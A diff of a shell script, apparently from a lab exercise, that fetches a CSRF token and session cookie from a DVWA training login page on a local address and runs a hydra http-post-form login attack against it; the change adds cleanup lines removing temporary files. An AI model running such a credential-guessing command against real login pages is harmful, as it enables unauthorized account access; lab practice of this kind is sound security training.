@@ -29,4 +29,8 @@ CSRF=$(curl -s -c dvwa.cookie 192.168.178.98/dvwa/login.php | awk -F 'value=' '/
 SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')
 #Figure out how to use hydra for this purpose
 rm -f hydra.restore
+rm -f dvwa.cookie
+rm -f root
+rm -f test
+rm -f try*
 hydra -l admin -p password -u -F -t 1 -w 10 -W 1 -V 192.168.178.98 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login&user_token=${CSRF}:S=Location\: index.php:H=Cookie: security=impossible; PHPSESSID=${SESSIONID}:C=/404.php"
